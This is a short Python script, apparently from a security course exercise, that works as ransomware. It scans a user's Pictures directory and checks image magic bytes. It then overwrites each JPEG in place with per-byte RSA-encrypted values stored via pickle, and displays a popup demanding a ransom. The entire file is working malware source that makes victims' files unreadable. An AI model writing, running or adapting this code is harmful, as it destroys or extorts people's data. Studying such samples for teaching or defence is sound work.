import sys
import pickle
import os

n = 22291846172619859445381409012451
e = 65535
directory = '/home/csc2023/Pictures/'
for filename in os.listdir(directory):
    file = directory + filename
    with open(file, 'rb') as f:
        bytes = f.read(11)
        if not bytes.startswith(b'\x89PNG\r\n\x1a\n') and not bytes.startswith(b'\xff\xd8\xff'):
            break

    if filename.endswith('.jpg'):
        plain_bytes = b''
        with open(file, 'rb') as f:
            plain_bytes = f.read()
        cipher_int = [pow(i, e, n) for i in plain_bytes]
        with open(file, 'wb') as f:
            pickle.dump(cipher_int, f)

os.system("zenity --error --text=\"{}\" --title=\"{}\"".format("Give me ranson haha!", "Error!"))
